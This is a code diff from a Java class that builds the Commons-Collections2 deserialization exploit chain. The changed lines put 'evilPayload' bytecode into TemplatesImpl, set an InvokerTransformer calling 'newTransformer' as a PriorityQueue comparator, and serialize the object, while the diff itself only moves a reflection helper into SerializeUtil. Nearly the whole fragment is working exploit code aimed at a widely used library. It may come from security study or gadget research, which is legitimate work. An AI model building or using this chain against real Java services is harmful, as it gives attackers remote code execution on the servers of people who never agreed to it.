@@ -77,12 +77,12 @@ public class Commoncollections2 {
         byte[] evilPayload = ctClass.toBytecode();
         //设置恶意字节码到TemplatesImpl中
         TemplatesImpl templates = new TemplatesImpl();
-        setFieldValue(templates,"_name","v1f18");
-//        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
-        setFieldValue(templates,"_bytecodes",new byte[][]{evilPayload});
+        SerializeUtil.setFieldValue(templates,"_name","v1f18");
+//        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
+        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evilPayload});
         InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",null,null);
         TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
-        setFieldValue(priorityQueue,"comparator",transformingComparator);
+        SerializeUtil.setFieldValue(priorityQueue,"comparator",transformingComparator);
 
         Field queue = priorityQueue.getClass().getDeclaredField("queue");
         queue.setAccessible(true);
@@ -92,10 +92,5 @@ public class Commoncollections2 {
         SerializeUtil.readObjectToFile();
     }
 
-    public static void setFieldValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException {
-        Field iTransformers = obj.getClass().getDeclaredField(name);
-        iTransformers.setAccessible(true);
-        iTransformers.set(obj,value);
-    }
 
 }
